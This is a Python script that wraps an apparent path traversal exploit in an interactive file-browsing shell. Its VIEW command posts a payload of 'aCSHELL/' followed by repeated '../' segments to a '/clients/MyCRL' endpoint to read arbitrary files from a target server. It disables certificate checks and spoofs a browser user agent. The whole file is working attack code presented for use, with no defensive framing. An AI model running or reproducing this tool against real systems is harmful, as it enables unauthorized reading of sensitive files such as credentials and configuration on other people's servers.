#!/usr/bin/env python3
import requests
from argparse import ArgumentParser
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class CLI:
    def __init__(self):
        self.host = None
        self.current_directory = '/'
        self.connected = False

    def connect(self, host):
        self.host = host
        self.connected = True
        print(f"Connected to {host}")

    def disconnect(self):
        self.host = None
        self.connected = False
        self.current_directory = '/'
        print("Disconnected")

    def cd(self, directory):
        if directory in ('..', '../'):
            self.current_directory = '/'.join(self.current_directory.rstrip('/').split('/')[:-1]) or '/'
        else:
            if not self.current_directory.endswith('/'):
                self.current_directory += '/'
            self.current_directory += directory.strip('/')
        
        print(f"Current directory: {self.current_directory}")

    def view(self, filename):
        if not self.connected: return

        target = f'https://{self.host}/clients/MyCRL'
        full_path = f'{self.current_directory}/{filename}'
        data = f'aCSHELL/../../../../../../../../../../..{full_path}'

        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0',
            'Te': 'trailers',
            'Dnt': '1'
        }

        response = requests.post(target, headers=headers, data=data, verify=False)

        if response.status_code == 200:
            print(response.text)
        else:
            print(f"Failed to view '{filename}' because HTTP: {response.status_code}. The file or directory probably doesnt exist.")

    def run(self):
        cmd_mapping = {
            "CONNECT": self.connect,
            "DISCONNECT": self.disconnect,
            "CD": self.cd,
            "VIEW": self.view,
        }

        while True:
            try:
                command = input("> ").strip().split()
                if not command: continue

                cmd = command[0].upper()
                args = command[1:]

                if cmd in cmd_mapping:
                    if cmd == "CONNECT" and not args:
                        print("Incorrect command usage. Use: CONNECT <ip>:<port>")
                    elif cmd == "CD" and not args:
                        print(f"Current directory: {self.current_directory}")
                    else:
                        cmd_mapping[cmd](*args)
                elif cmd == "EXIT":
                    break
                else:
                    print("Unknown command")
            except EOFError:
                break
            except KeyboardInterrupt:
                print("\nExiting")
                break

if __name__ == '__main__':
    cli = CLI()
    cli.run()